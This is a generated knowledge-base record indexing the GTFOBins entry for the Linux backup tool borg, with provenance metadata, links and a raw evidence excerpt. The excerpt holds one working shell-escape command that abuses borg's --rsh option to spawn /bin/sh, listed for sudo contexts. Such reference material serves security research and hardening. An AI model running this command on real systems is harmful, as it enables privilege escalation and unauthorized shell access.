---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# borg

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `borg` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/borg` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for borg covering shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/borg.md)
- Source verification: [source record](../../sources/gtfobins/borg.md)

## Aliases

- `borg`

## Source Verification

[source record](../../sources/gtfobins/borg.md)

## Evidence Excerpt

```text
_body: ''
_name: borg
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/borg
functions:
shell:
- code: 'borg extract @:/::: --rsh "/bin/sh -c ''/bin/sh </dev/tty >/dev/tty 2>/dev/tty''"'
contexts:
sudo: null
```
